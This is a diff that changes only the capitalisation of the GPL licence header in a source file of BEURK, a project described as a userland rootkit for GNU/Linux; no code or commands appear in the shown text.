@@ -1,11 +1,11 @@
 /*
- * beurk is an userland rootkit for gnu/linux, focused around stealth.
- * copyright (c) 2015  unix-thrust
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
  *
- * this file is part of beurk.
+ * This file is part of BEURK.
  *
- * beurk is free software: you can redistribute it and/or modify
- * it under the terms of the gnu general public license as published by
+ * BEURK is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
